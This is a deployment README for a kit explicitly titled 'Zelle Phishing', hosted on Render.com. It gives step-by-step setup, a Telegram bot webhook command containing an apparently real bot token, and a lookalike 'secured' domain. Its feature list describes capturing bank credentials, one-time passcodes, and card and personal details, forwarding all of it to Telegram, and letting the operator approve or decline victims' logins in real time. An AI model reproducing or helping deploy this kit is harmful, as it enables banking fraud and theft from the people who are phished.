# Zelle Phishing - Render.com Deployment

## 📦 What's Included

- **server.js** - Node.js backend (replaces PHP)
- **package.json** - Dependencies
- **public/** - All frontend files (HTML, CSS, JS)

---

## 🚀 Deployment Steps

### 1. Create GitHub Repo

1. Go to https://github.com/new
2. Name: `zelle-secure` (or anything)
3. Set to **Public**
4. Click **Create repository**

### 2. Upload Files to GitHub

1. Click **"uploading an existing file"**
2. Drag ALL files from `zelle-render-deploy/` folder:
   - `server.js`
   - `package.json`
   - `public/` folder (with all contents)
3. Click **"Commit changes"**

### 3. Deploy to Render

1. Go to https://dashboard.render.com/
2. Click **"New +"** → **"Web Service"**
3. Click **"Git Provider"** → **"GitHub"**
4. Authorize Render
5. Select your `zelle-secure` repo
6. Configure:
   - **Name:** `zelle-secure`
   - **Environment:** `Node`
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
7. Click **"Create Web Service"**

### 4. Wait for Deployment

Render will:
- Install dependencies
- Start the server
- Give you a URL like: `https://zelle-secure.onrender.com`

### 5. Set Up Telegram Webhook

Once deployed, run this command (replace URL):

```
https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook?url=https://YOUR-RENDER-URL.onrender.com/telegram-webhook
```

Example:
```
https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook?url=https://zelle-secure.onrender.com/telegram-webhook
```

### 6. Add Custom Domain

1. In Render dashboard, go to your service
2. Click **"Settings"** → **"Custom Domains"**
3. Add: `secured01.info.gf`
4. Render will give you a CNAME record
5. Go to FreeDNS and update your domain to point to Render's CNAME

---

## ✅ What Works

- ✅ Bank selector
- ✅ Credentials capture
- ✅ OTP capture with Telegram buttons
- ✅ Approve/Decline flow
- ✅ Shake animation on decline (no "Try Again" button)
- ✅ Multi-step verification (Personal Info with card fields, Email, Final OTP)
- ✅ All data sent to Telegram

---

## 🧪 Testing

Visit your Render URL:
- `https://YOUR-RENDER-URL.onrender.com/`

Test the full flow:
1. Select bank
2. Enter credentials
3. Submit OTP
4. Check Telegram for notification
5. Click Approve/Decline
6. Verify shake animation works

---

## 📝 Notes

- **Free tier:** Render's free tier spins down after 15 minutes of inactivity (first load will be slow)
- **Upgrade:** $7/month for always-on hosting
- **Data storage:** Currently in-memory (resets on restart) - consider adding a database for persistence
